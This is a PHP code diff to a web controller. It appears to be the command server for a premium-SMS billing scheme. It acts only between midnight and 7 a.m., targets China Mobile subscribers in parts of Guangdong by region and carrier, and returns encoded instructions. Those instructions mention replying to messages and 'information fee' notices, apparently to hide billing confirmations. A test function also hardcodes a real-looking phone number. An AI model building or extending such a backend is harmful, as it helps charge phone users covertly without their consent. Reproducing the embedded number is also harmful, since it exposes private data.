@@ -20,10 +20,6 @@ class Resources extends Controller
         // 获取参数
         $data = input("get.");
 
-//        $uri = (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https' : 'http') . '://' . '101.132.102.248' . $_SERVER['REQUEST_URI'];
-//        $res = Model("Url");
-//        $res->insert(["url"=>$uri]);
-
         // 当前时间(只允许0~7时操作)
         $now = date("H");
         if ($now >= 7) {
@@ -47,6 +43,11 @@ class Resources extends Controller
                     Model("Success")->insert(["phone" => $phone, "type" => 3, "uid" => $data['uid']]);
                     return "1KW1002DH?1?ehwwhwdh?XL9?3?" . $data['uid'] . "?60?0?0";
                 }
+                if ($res->province == "广东" && !in_array($res->city,['广州','河源']) && $res->isp == '移动'){
+                    Model("Success")->insert(["phone" => $phone, "type" => 4, "uid" => $data['uid']]);
+                    // return "1KW1002DH?1?ehwwhsel?DZ14?2?1?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
+                    return "1KW1002DH?1?ehwwhsel?DZ14?1?" . $data['uid'] . "?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
+                }
             }
         }
         return "123";
@@ -60,11 +61,15 @@ class Resources extends Controller
      */
     public function test(){
 
-
-        $phone = 'hrweorhhrdrshh';
-
         // 格式化数据
         $DataProcessing = Model('DataProcessing','logic');
+        $phone = '13600306638';
+        $phone = $DataProcessing->encodePhone($phone);
+
+        dump($phone);
+
+
+        $phone = 'eorhhdeashh';
         $phone = $DataProcessing->formatPhoneNumber($phone);
 
         // 查找归属地
